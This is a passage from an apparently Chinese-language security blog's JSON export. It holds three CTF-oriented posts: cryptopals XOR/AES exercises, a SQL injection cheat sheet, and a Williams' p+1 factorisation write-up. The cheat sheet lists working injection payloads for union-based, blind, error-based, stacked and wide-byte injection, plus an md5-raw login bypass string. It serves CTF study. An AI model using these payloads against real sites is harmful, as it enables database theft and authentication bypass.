crazy when I hear a cymbal&quot; key = &#x27;ICE&#x27; padkey = keypadding(len(plain), key) hexplain = text2hex(plain) hexpadkey = text2hex(padkey) print(fixed_xor(hexplain, hexpadkey))if __name__ == &#x27;__main__&#x27;: main() cryptopals 1.6 - Break repeating-key XOR题目 There’s a file here. It’s been base64’d after being encrypted with repeating-key XOR. Decrypt it. Here’s how: Let KEYSIZE be the guessed length of the key; try values from 2 to (say) 40. Write a function to compute the edit distance/Hamming distance between two strings. The Hamming distance is just the number of differing bits. The distance between:this is a test and wokka wokka!!! is 37. Make sure your code agrees before you proceed. For each KEYSIZE, take the first KEYSIZE worth of bytes, and the second KEYSIZE worth of bytes, and find the edit distance between them. Normalize this result by dividing by KEYSIZE. The KEYSIZE with the smallest normalized edit distance is probably the key. You could proceed perhaps with the smallest 2-3 KEYSIZE values. Or take 4 KEYSIZE blocks instead of 2 and average the distances. Now that you probably know the KEYSIZE: break the ciphertext into blocks of KEYSIZE length. Now transpose the blocks: make a block that is the first byte of every block, and a block that is the second byte of every block, and so on. Solve each block as if it was single-character XOR. You already have code to do this. For each block, the single-byte XOR key that produces the best looking histogram is the repeating-key XOR key byte for that block. Put them together and you have the key. This code is going to turn out to be surprisingly useful later on. Breaking repeating-key XOR (“Vigenere”) statistically is obviously an academic exercise, a “Crypto 101” thing. But more people “know how” to break it than can actually break it, and a similar technique breaks something much more important. cryptopals 1.7 - AES in ECB mode题目 The Base64-encoded content in this file has been encrypted via AES-128 in ECB mode under the key &quot;YELLOW SUBMARINE&quot;. (case-sensitive, without the quotes; exactly 16 characters; I like “YELLOW SUBMARINE” because it’s exactly 16 bytes long, and now you do too). Decrypt it. You know the key, after all. Easiest way: use OpenSSL::Cipher and give it AES-128-ECB as the cipher. You can obviously decrypt this using the OpenSSL command-line tool, but we’re having you get ECB working in code for a reason. You’ll need it a lot later on, and not just for attacking ECB. 未完待续… cryptopals 1.8 - Detect AES in ECB mode题目In this file are a bunch of hex-encoded ciphertexts. One of them has been encrypted with ECB. Detect it. Remember that the problem with ECB is that it is stateless and deterministic; the same 16 byte plaintext block will always produce the same 16 byte ciphertext. 未完待续…","tags":[{"name":"Crypto","slug":"Crypto","permalink":"http://tearsjin.github.io/tags/Crypto/"},{"name":"cryptopals","slug":"cryptopals","permalink":"http://tearsjin.github.io/tags/cryptopals/"}]},{"title":"Experience summary of SQL injection","date":"2020-09-29T09:16:53.000Z","path":"2020/09/29/SQL注入经验大杂烩/","text":"一般注入通过修改参数的值, 例如正常数字 大数字 字符 单引号 双引号 括号 反斜杠等等来探测是否存在注入点. 如果有报错信息, 则可以根据报错信息还原SQL语句. 例如在数字后面加 ‘ 不行则可以试试加 \\ 注入操作(找到注入点并还原SQL语句后) 利用order by来判断字段数(联合查询需要相同的字段) 得到字段数后, 判断显位. 例如url?id=-1&#39; union select 1,2,3, 观察哪个数字会显示出来. 获取数据库名(显位是2的情况下,下面也是) union select 1,database(),3 select 1 , group_concat(schema_name) , 3 from information_schema.schemata 列出数据库中所有表(假设库名是test) select group_concat(table_name) from information_schema.tables where table_schema = test 如果不行 可以试试&#39;test&#39; 0x674657374(把test转成十六进制) database() 列出所有字段 select group_concat(column_name) from information_schema,columns where table_name = 爆数据就完事了 盲注跟一般注入的区别在于, 服务端不再返回报错内容, 注入的时候只能知道自己输入的语句是否出错, 而且也不能直接得到库名表名这些. 盲注一般分为两种, 一种是基于布尔的, 一种是基于时间的. 相关函数使用盲注得知道一些函数: ascii(str): str是一个字符串参数，返回值为其最左侧字符的ascii码。通过它，我们才能确定特定的字符。 substr(str,start,len): 这个函数是取str中从下标start开始的，长度为len的字符串。通常在盲注中用于取出单个字符，交给ascii函数来确定其具体的值。 length(str): 这个函数是用来获取str的长度的。这样我们才能知道需要通过substr取到哪个下标。 count([column]): 统计记录的数量，其在盲注中，主要用于判断符合条件的记录的数量，并逐个破解。 if(condition,a,b): 当condition为true的时候，返回a，当condition为false的时候，返回b。 sleep(n): 服务端等待n秒后返回记录, 在时间盲注中, 用于判断语句是否正确. benchmark(times, func): 执行times次func, 也用于时间盲注, 通过服务端的反应时间来判断语句是否正确. 基于布尔的盲注基于布尔的盲注是根据页面差来进行判断注入和数据注入的。在存在注入的页面输入and (true)则返回页面1；输入and (false)则返回页面2，而页面1和页面2有差别，常见的情况页面1是正常页面，页面2是错误页面 注入操作 获取用户名 猜用户名的长度and(select length(user()))=数字, 不断尝试不同的数字得到用户名的长度 逐位猜解用户名 and (select ascii(mid(user(),位数,1)))=114, 猜测在某个位置的字母的ASCII码为114. 通过观察返回的页面来判断每一位的字母, 最终得到用户名 获取当前数据库的库名 猜库名长度and (select length(database()))=数字 逐位猜解库名and (select ascii(mid(database(),位数,1)))=116 获取表名 判断表的数量and (select count(table_name) from information_schema.tables where table_schema=database())=4,这条语句就是判断数据库中有4张表 判断表名的长度and (select length(table_name) from information_schema.tables where table_schema=database() limit 位数,1)=5, 位数指的是第几张表 逐位拆解表名and (select ascii(mid(table_name,表名的第几位,1)) from information_schema.tables wheretable_schema=database() limit 第几张表,1)=100 获取列名 判断列的数量and (select count(column_name) form information_schema.columns where table_schema=表名)=数字 判断列的长度and (select length(column_name) form information_schema.columns where table_schema=表名 limit 第几列,1)=数字 逐位猜解列名and (select ascii(mid(column_name,第几个字母,1)) form information_schema.columns where table_schema=表名 limit 第几列,1)=数字 获取数据 判断数据的条数and (select conut(列名) from 表名)=数字 判断数据的长度and (select length(列名) from 表名 limit 第几条,1)=数字 逐位猜解数据and (select ascii(mid(列名,第几个字母,1)) from 表名 limit 第几条,1)=数字 事实上,以上语句中的’=’都可以用’&lt;’和’&gt;’来代替以便于更快的确定数据, 而且手工注入往往需要大量的尝试, 这非常的操蛋繁琐, 一般可以写脚本来注入 基于时间的盲注利用sleep()或benchmark()等函数让mysql执行时间变长经常与if(expr1,expr2,expr3)语句结合使用, 通过页面的响应时间来判断条件是否正确. if(expr1,expr2,expr3)含义是如果expr1是True, 则返回expr2, 否则返回expr3. 注入操作反正也不会真的去手工注入sqlmap即可 报错注入报错注入有很多很多(至少我在网上查找资料的时候看见了很多), 一边做题, 一边把遇到的报错注入的方法进行总结吧.报错注入就是利用了数据库的某些机制，人为地制造错误条件，使得查询结果能够出现在错误信息中 目录 通过extractvalue()或updatexml()函数 通过extractvalue()或updatexml()函数场景 当union被过滤的时候 原理extractvalue() :对XML文档进行查询的函数udatexml() :对XML文档进行更新的函数语法： extractvalue(文档，路径) updatexml(目标xml文档，xml路径，更新的内容) 路径写入其他格式，就会报错并且会返回我们写入的非法格式内容，我们可以利用这个得到我们想得到的内容* 常用payload1234查数据库名：id&#x3D;&#39;and(select extractvalue(1,concat(0x7e,(select database()))))爆表名：id&#x3D;&#39;and(select extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()))))爆字段名：id&#x3D;&#39;and(select extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name&#x3D;&quot;TABLE_NAME&quot;))))爆数据：id&#x3D;&#39;and(select extractvalue(1,concat(0x7e,(select group_concat(COIUMN_NAME) from TABLE_NAME)))) 例题: buuctf 极客大挑战 hardsql情景: order by union 空格 and 被过滤查字段名时候的payload:?username=44&amp;password=1&#39;^extractvalue(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where((table_name)like(&#39;H4rDsq1&#39;)))))%23 读取文件堆叠注入在正常的语句后面加分号( ; ),可顺序执行多条语句, 从而造成注入漏洞.堆叠注入的局限性在于并不是每一个环境下都可以执行，可能受到API或者数据库引擎不支持的限制，当然了权限不足也可以解释为什么攻击者无法修改数据或者调用一些程序。 堆叠注入可以搭配一些语句来绕过对某些关键词的过滤: 12345;show databases ------列出所有数据库;show tables ------列出所有表;show columns from table_name ------列出某个表的所有字段;desc table_name 通过RENAME更改flag所在表名为默认查询的表名更改表名: rename table tbl_name to new_tbl_namealter table table_name to new name 更改列名 alter table t_app change name app_name varchar(20) 绕过方法宽字节注入利用编码转换, 将服务器端强制添加的本来用于转义的\\符号吃掉, 从而能使攻击者输入的引号起到闭合作用, 以至于可以进行SQL注入. 操作如在进行url?id=1&#39;等操作时, 发现无论如何都不报错, 或者报错了莫名其妙的多出了有, 此时就可以使用url?id=1%df&#39;, 这时服务端会在’前面添加一个, \\的ASCII码为0x5c, 因为前面的%df大于128, 服务端会将0xdf和0x5c合并成0xdf5c即汉字 “运”, 从而达到了绕过\\转义’的目的 PHP预处理使用concat(char(num,num,num)) 即使用ascii码转成字符再拼接来绕过对某些关键词的过滤. SQLite注入与sql不同的是, sqlite少了一些函数, 比如database()等等, 而且如果使用了不存在的函数也无法爆出库名.但是sqlite存在一个sqlite_master表, 里面的字段为type/name/tbl_name/rootpage/sql可以通过查询该表内信息得到表名, 并且可以通过sql字段内的sql语句得到对应表内的字段 一些奇怪的总结???jarvis oj - login这是一道要用万能密码登录的题sql语句是: 1&quot;select * from &#96;admin&#96; where password&#x3D;&#39;&quot;.md5($pass,true).&quot;&#39;&quot; php的md5()这个函数, 可以有第二个参数, 如果是true, 则回返回原始的二进制数据, 也就是原本md5出来的32位十六进制字符串转成真正的十六字节的字符串.那么这里要登录进去, 需要把语句构造成: 12&quot;select * from &#96;admin&#96; where password&#x3D;&#39;&#39;or&#39;1&#39;&quot; # or后面的1可以换成别的, 只要是一个字符串就好了 然后这里用到了一个字符串ffifdyop, 为啥用这个呢? 因为如果$pass=ffifdyop, 那么语句就会变成 1&quot;select * from &#96;admin&#96; where password&#x3D;&#39;&#39;or&#39;6&#39;&quot; 这样就能登录啦","tags":[{"name":"Summary","slug":"Summary","permalink":"http://tearsjin.github.io/tags/Summary/"},{"name":"Web","slug":"Web","permalink":"http://tearsjin.github.io/tags/Web/"},{"name":"SQL","slug":"SQL","permalink":"http://tearsjin.github.io/tags/SQL/"}]},{"title":"Williams's p+1 algorithm","date":"2020-09-26T02:33:58.000Z","path":"2020/09/26/Williams-s-p-1-algorithm/","text":"在计算数论中，Williams的p+1算法是一种整数分解算法，是代数群因子分解算法家族中的一种。它是Hugh C. Williams在1982年发明的。如果要分解的数N包含一个或多个素数因子p，且p+1是光滑的(即p+1只包含小的因子)，那么Williams’s p+1有效。Williams’s p+1使用Lucas序列在二次域中执行求幂运算。 它类似于Pollard的p−1算法。 算法原理选择一个大于2的整数A来计算Lucas序列:$$ V_0 = 2,V_1 = A $$$$ V_j = AV_{j-1}-V_{j-2} $$其中所有的运算都是模N的 当M是$p-(D/p)$的倍数时，奇素数p整除$gcd(N,V_M-2)$， $D=A^2-4$$(D/P)$是jacobi symbol 我们要求$(D/p)=-1$，即D应该是一个模p的二次的非剩余，但是由于我们不知道p，所以在找到解之前可能需要一个以上的A值。($D=A^2-4$) 如果$(D/p)=+1$，则该算法退化为Pollard的p−1算法的慢版本。 因此，对于不同的M值，我们计算 $gcd(N,V_{M-2})$ ，当结果不等于1或N时，我们便找到了N的一个非平凡因子。 使用的M值是连续的阶乘，而 $V_M$ 是以 $V_{M-1}$ 为特征的序列的第M个值 为了找到以B为特征的序列的第M个元素V，我们以类似于从左到右求幂的方式进行计算: 12345678910x :&#x3D; By :&#x3D; ( B ^ 2 - 2 ) MOD Nfor each bit of M to the right of the most significant bit do if the bit is 1 then x :&#x3D; ( x * y - B ) MOD N y :&#x3D; ( y ^ 2 - 2 ) MOD N else y :&#x3D; ( x ^ y - B ) MOD N x :&#x3D; ( x ^ 2 - 2 ) MOD NV :&#x3D; x 例子令n = 112729，A = 5，求得的$V_M$的连续值为: 1234567V1 of seq(5) &#x3D; V1! of seq(5) &#x3D; 5V2 of seq(V1) &#x3D; V2! of seq(5) &#x3D; 23V3 of seq(V2) &#x3D; V3! of seq(5) &#x3D; 12098V4 of seq(V3) &#x3D; V4! of seq(5) &#x3D; 87680V5 of seq(V4) &#x3D; V5! of seq(5) &#x3D; 53242V6 of seq(V5) &#x3D; V6! of seq(5) &#x3D; 27666V7 of seq(V6) &#x3D; V7! of seq(5) &#x3D; 110229 此时，$gcd(110229-2,112729) = 139$，所以139 是112729的一个非平凡素因子。注意到 $p+1 = 140 = 2^2 * 5 * 7$。而 $7!$ 是最小的是140的倍数的阶乘数，所以我们找到了一个合适的因子139。 例题 [V&amp;N2020 公开赛]easy_RSA就是因为这题，才会想到Williams’s p+1审计代码发现n = qpr 中三个因子都是p+1光滑的所以想到Williams’s p+1 12345678910111213141516171819202122232425n=7941371739956577280160664419383740967516918938781306610817149744988379280561359039016508679365806108722198157199058807892703837558280678711420411242914059658055366348123106473335186505617418956630780649894945233345985279471106888635177256011468979083320605103256178446993230320443790240285158260236926519042413378204298514714890725325831769281505530787739922007367026883959544239568886349070557272869042275528961483412544495589811933856131557221673534170105409A = [5, 7, 9, 11, 13]def seq(t, base, n): x = 2 y = base i = 0 while True: x, y = y, (base * y - x) % n i += 1 if i == t: return x breakfac = []for v in A: for i in range(1, 5000): v = seq(i, v, n) p = gmpy2.gcd(v - 2, n) print(i,p) if p != 1: fac.append(p) break if len(fac) != 0: break 当程序在A = 5 , i = 2391时就跑出了其中一个因子为 1102634610559478918970860957918259981057327949366949344137104804864768237961662136189827166317524151288799657758536256924609797810164397005081733039415393 然后用n除以这个因子并对得数继续Williams’s p+1便可以分解出剩下的两个因子 wiki没有中文可真是头大(原理和例子其实就是英文wiki上Williams’s p+1的摘抄+翻译啦","tags":[{"name":"Crypto","slug":"Crypto","permalink":"http://tearsjin.github.io/tags/Crypto/"},{"name":"Algorithm","slug":"Algorithm","permalink":"http://tearsjin.github.io/tags/Algorithm/"}]}]